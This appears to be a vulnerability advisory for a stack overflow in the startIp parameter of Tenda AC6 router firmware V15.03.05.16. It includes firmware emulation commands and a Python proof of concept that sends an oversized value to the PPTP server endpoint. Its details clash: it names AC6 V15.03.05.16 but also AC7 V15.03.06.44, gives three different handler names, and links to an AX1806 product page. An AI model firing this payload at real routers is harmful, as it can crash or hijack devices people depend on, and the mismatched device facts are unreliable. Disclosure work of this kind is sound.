### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![image](https://github.com/user-attachments/assets/9dd2dd44-e173-4d40-87f2-8e167129aaae)


### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

### Vulnerability details
Tenda ac6 V15.03.05.16 Stack overflow is found in the startip parameter in the function SetPPTPServer. You can build payload for remote command execution
![image](https://github.com/user-attachments/assets/27c1c05c-0b31-4ebf-91a1-7e339f3722d2)

A buffer overflow vulnerability exists in the formSetPPTPServer function of tenda AC7 V15.03.06.44. The vulnerability could allow an attacker to exploit malicious input to overwrite other important data in memory, potentially causing the device to crash or execute arbitrary code.

### poc
```
import requests

url = "http://192.168.142.100/goform/SetPptpServerCfg"

data = {
    "endIp": "192.168.142.100",  
    "startIp": "raining"*0x200
}

response = requests.post(url,  data=data)

print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")
```
![image](https://github.com/user-attachments/assets/a99dd684-a13e-45e4-8791-6b205aa60d19)
